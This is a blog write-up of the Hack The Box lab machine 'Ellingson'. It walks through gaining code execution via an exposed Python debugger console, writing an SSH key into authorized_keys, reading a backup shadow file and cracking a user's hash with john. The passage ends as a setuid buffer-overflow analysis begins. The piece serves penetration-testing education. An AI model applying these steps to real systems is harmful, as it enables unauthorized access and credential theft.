<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Ellingson - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Ellingson from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Ellingson">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ellingson/">


  <meta property="og:description" content="My write-up / walkthrough for Ellingson from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Ellingson">
  <meta name="twitter:description" content="My write-up / walkthrough for Ellingson from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/ellingson/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-10-19T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ellingson/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Ellingson">
    <meta itemprop="description" content="Hack The Box - Ellingson">
    <meta itemprop="datePublished" content="2019-10-19T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/ellingson/" class="u-url" itemprop="url">Hack The Box - Ellingson
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-10-19T07:00:00+02:00">October 19, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          15 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---ellingson">Hack The Box - Ellingson</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#web-enumeration">Web Enumeration</a></li>
<li><a href="#rce--ssh-as-hal">RCE –&gt; SSH as hal</a></li>
<li><a href="#shadowbak--ssh-as-margo">shadow.bak –&gt; SSH as margo</a></li>
<li><a href="#binary-analysis">Binary: Analysis</a></li>
<li>
<a href="#binary-exploitation">Binary: Exploitation</a><ul>
<li><a href="#exploitation-leaking-libc-base-address">Exploitation: Leaking libc base address</a></li>
<li><a href="#exploitation-ret2libc">Exploitation: ret2libc</a></li>
<li><a href="#exploitation-setuid--root-shell">Exploitation: setuid –&gt; root shell</a></li>
</ul>
</li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---ellingson">Hack The Box - Ellingson</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, today Ellingson retired and here’s my write-up about it. It was a fun box with a very nice binary exploitation privesc, I found the way of getting RCE on this box (which was by abusing the debugger of a python server that was running on the box) very interesting. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.139</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">ellingson.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/ellingson/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# nmap -sV -sT -sC -o nmapinitial ellingson.htb 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-18 14:11 EET
Nmap scan report for ellingson.htb (10.10.10.139)
Host is up (0.13s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://ellingson.htb/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">http</code> on port 80 and <code class="language-plaintext highlighter-rouge">ssh</code> on port 22.<br></p>

<h2 id="web-enumeration">Web Enumeration</h2>
<p>Let’s take a look at the index page:
<code class="language-plaintext highlighter-rouge">http://ellingson.htb</code>:
<br><img src="/images/hackthebox/ellingson/1.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ellingson/2.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ellingson/3.png" alt="" class="align-center"><br><br>
The only interesting thing was these articles at the top of the page:
<br><img src="/images/hackthebox/ellingson/1.png" alt="" class="align-center"><br><br>
The first one was talking about a virus that was planted in their mainframe:
<br><img src="/images/hackthebox/ellingson/4.png" alt="" class="align-center"><br><br>
The second one was talking about a brute-force protection that was recently added which tells us not to attempt to bruteforce anything or we’ll get banned:
<br><img src="/images/hackthebox/ellingson/5.png" alt="" class="align-center"><br><br>
The third one was advising users to change their passwords because of some suspicious network activity that was detected, telling them that the most common passwords are Love, Secret, Sex and God:
<br><img src="/images/hackthebox/ellingson/6.png" alt="" class="align-center"><br><br>
So far the only interesting thing we have is the 4 common passwords.<br>
The articles path followed this pattern: <code class="language-plaintext highlighter-rouge">/articles/n</code> (<code class="language-plaintext highlighter-rouge">n</code> is the article number) so I thought of trying different numbers to see if there’s a hidden article or something like that. When I tried <code class="language-plaintext highlighter-rouge">4</code> I got an error because that article doesn’t exist, I expected a <code class="language-plaintext highlighter-rouge">404</code> error but I got this debugger:
<br><img src="/images/hackthebox/ellingson/7.png" alt="" class="align-center"><br><br>
By hovering over one of the lines a small console icon appears, its description says that it open an interactive python shell:
<br><img src="/images/hackthebox/ellingson/8.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ellingson/9.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ellingson/10.png" alt="" class="align-center"><br><br></p>

<h2 id="rce--ssh-as-hal">RCE –&gt; SSH as hal</h2>
<p>With <code class="language-plaintext highlighter-rouge">popen()</code> from <code class="language-plaintext highlighter-rouge">os</code> we can execute commands and read the output like this:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'whoami'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
<span class="n">hal</span>
</code></pre></div></div>
<p>We are executing commands as <code class="language-plaintext highlighter-rouge">hal</code> who doesn’t have the user flag:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'pwd'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
<span class="o">/</span>

<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'ls -la /home'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
<span class="n">total</span> <span class="mi">24</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">6</span> <span class="n">root</span>      <span class="n">root</span>      <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">23</span> <span class="n">root</span>      <span class="n">root</span>      <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">..</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">3</span> <span class="n">duke</span>      <span class="n">duke</span>      <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="n">duke</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">5</span> <span class="n">hal</span>       <span class="n">hal</span>       <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">12</span> <span class="n">hal</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">6</span> <span class="n">margo</span>     <span class="n">margo</span>     <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">18</span> <span class="mi">11</span><span class="p">:</span><span class="mi">01</span> <span class="n">margo</span>
<span class="n">drwxrwx</span><span class="o">---</span>  <span class="mi">4</span> <span class="n">theplague</span> <span class="n">theplague</span> <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">13</span> <span class="n">theplague</span>

<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'ls -la /home/hal'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
<span class="n">total</span> <span class="mi">36</span>
<span class="n">drwxrwx</span><span class="o">---</span> <span class="mi">5</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">12</span> <span class="p">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">220</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">3771</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">bashrc</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">cache</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">gnupg</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">807</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">profile</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">18</span> <span class="mi">08</span><span class="p">:</span><span class="mi">28</span> <span class="p">.</span><span class="n">ssh</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">865</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">viminfo</span>
</code></pre></div></div>
<p>So we will need to be another user, however we need to get a shell first. We can simply <code class="language-plaintext highlighter-rouge">echo</code> our public key to <code class="language-plaintext highlighter-rouge">/home/hal/.ssh/auhtorized_keys</code> and get <code class="language-plaintext highlighter-rouge">ssh</code> as hal:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'echo </span><span class="se">\"</span><span class="s">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGEUzu7cGthWtPNXM5/rAvPBywgyh68AEpSyUBXm24kByXu+GhEmvAiVlkAhasBgTjiCbpup3dmzz54ADlo4T2jUWoVVEDOw82eKQ6EoqpYnHGVmpDmJ1n7+eCvb3ut0bl5VOnTkhYSWS8G9V6V+E/VmDun63HoHCHzvtBlbN/ZmhRKxdwNFSYN/NswU8MFK+MVXxa/FJUxrOJVAnefXQdfDBxIt4j/qqMr68u9lQfqOX5shmS0M55lFNAY2mR6INBQtT6AnAWremPCHdUHxU3eSvzUcItaamecSPTfDgMQDQkxXrrsKQLkJeCKZ/1EwDBXIF3RGCeNGq0hCYHSF8d root@kali</span><span class="se">\"</span><span class="s"> &gt; /home/hal/.ssh/authorized_keys'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>

</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# ssh -i ./id_rsa hal@ellingson.htb 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 18 12:30:03 UTC 2019

  System load:  0.0                Processes:            105
  Usage of /:   23.8% of 19.56GB   Users logged in:      1
  Memory usage: 18%                IP address for ens33: 10.10.10.139
  Swap usage:   0%

  =&gt; There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 18 09:08:47 2019 from 10.10.15.92
hal@ellingson:~$ whoami
hal
hal@ellingson:~$ 
</code></pre></div></div>

<h2 id="shadowbak--ssh-as-margo">shadow.bak –&gt; SSH as margo</h2>
<p>There are 4 users on the box: <code class="language-plaintext highlighter-rouge">duke</code>, <code class="language-plaintext highlighter-rouge">hal</code>, <code class="language-plaintext highlighter-rouge">margo</code> and <code class="language-plaintext highlighter-rouge">theplague</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hal@ellingson:/home$ ls -al
total 24
drwxr-xr-x  6 root      root      4096 Mar  9  2019 .
drwxr-xr-x 23 root      root      4096 Mar  9  2019 ..
drwxrwx---  3 duke      duke      4096 Mar 10  2019 duke
drwxrwx---  5 hal       hal       4096 May  7 13:12 hal
drwxrwx---  6 margo     margo     4096 Oct 18 11:01 margo
drwxrwx---  4 theplague theplague 4096 May  7 13:13 theplague
hal@ellingson:/home$ 
</code></pre></div></div>
<p>One of the places I always like to check when trying to escalate privileges is <code class="language-plaintext highlighter-rouge">/var/backups</code>. On this box there was a backup for <code class="language-plaintext highlighter-rouge">/etc/shadow</code> there:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hal@ellingson:/var/backups$ ls -la
total 708
drwxr-xr-x  2 root root     4096 May  7 13:14 .
drwxr-xr-x 14 root root     4096 Mar  9  2019 ..
-rw-r--r--  1 root root    61440 Mar 10  2019 alternatives.tar.0
-rw-r--r--  1 root root     8255 Mar  9  2019 apt.extended_states.0
-rw-r--r--  1 root root      437 Jul 25  2018 dpkg.diversions.0
-rw-r--r--  1 root root      295 Mar  9  2019 dpkg.statoverride.0
-rw-r--r--  1 root root   615441 Mar  9  2019 dpkg.status.0
-rw-------  1 root root      811 Mar  9  2019 group.bak
-rw-------  1 root shadow    678 Mar  9  2019 gshadow.bak
-rw-------  1 root root     1757 Mar  9  2019 passwd.bak
-rw-r-----  1 root adm      1309 Mar  9  2019 shadow.bak
hal@ellingson:/var/backups$ cat shadow.bak
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
hal@ellingson:/var/backups$ 
</code></pre></div></div>
<p>First time I solved the box I created a list with all password combinations from rockyou that had the words “love, secret, sex and god” (most common passwords we saw earlier) and tried to crack the 3 hashes with it. I could get <code class="language-plaintext highlighter-rouge">margo</code>’s password which had “god” in it.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# echo 'margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::' &gt; margo.hash
root@kali:~/Desktop/HTB/boxes/ellingson# grep -i god /usr/share/wordlists/rockyou.txt &gt; list.txt
root@kali:~/Desktop/HTB/boxes/ellingson# john --wordlist=./list.txt margo.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
iamgod$08        (margo)
1g 0:00:00:08 DONE (2019-10-18 14:58) 0.1234g/s 829.6p/s 829.6c/s 829.6C/s iamgod22..hydrogod20
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>
<p>Now we can simply <code class="language-plaintext highlighter-rouge">ssh</code> into the box as <code class="language-plaintext highlighter-rouge">margo : iamgod$08</code>:
<br><img src="/images/hackthebox/ellingson/11.png" alt="" class="align-center"><br><br></p>

<p>We owned user.<br></p>

<h2 id="binary-analysis">Binary: Analysis</h2>
<p>I searched for <code class="language-plaintext highlighter-rouge">suid</code> binaries and found a strange binary called <code class="language-plaintext highlighter-rouge">garbage</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ find / -perm -4000 2&gt;/dev/null            
/usr/bin/at        
/usr/bin/newgrp        
/usr/bin/pkexec        
/usr/bin/passwd       
/usr/bin/gpasswd        
/usr/bin/garbage      
/usr/bin/newuidmap           
/usr/bin/sudo
/usr/bin/traceroute6.iputils           
/usr/bin/chfn     
/usr/bin/newgidmap           
/usr/bin/chsh
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/umount
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/fusermount
---
</code></pre></div></div>
<p>When executed it asks for a password, providing a long password crashes it:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>margo@ellingson:~$ /usr/bin/garbage
Enter access password: test

access denied.
margo@ellingson:~$ /usr/bin/garbage 
Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

access denied.
Segmentation fault (core dumped)
margo@ellingson:~$ 
</code></pre></div></div>
<p>So we have a buffer overflow, I downloaded the binary on my machine:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ellingson# scp margo@ellingson.htb:/usr/bin/garbage ./                                                                                                                              
margo@ellingson.htb's password:
garbage                                                                                                                                                                          100%   18KB  60.4KB/s   00:00    
root@kali:~/Desktop/HTB/boxes/ellingson#
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">checksec</code> shows that <code class="language-plaintext highlighter-rouge">NX</code> (non-executable stack) is enabled so we will do a <code class="language-plaintext highlighter-rouge">ret2libc</code> attack:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="err">#</span> <span class="n">file</span> <span class="n">garbage</span>
<span class="n">garbage</span><span class="o">:</span> <span class="n">setuid</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mi">3</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="n">de1fde9d14eea8a6dfd050fffe52bba92a339959</span><span class="p">,</span> <span class="n">not</span>
<span class="n">stripped</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="err">#</span> <span class="n">checksec</span> <span class="p">.</span><span class="o">/</span><span class="n">garbage</span>
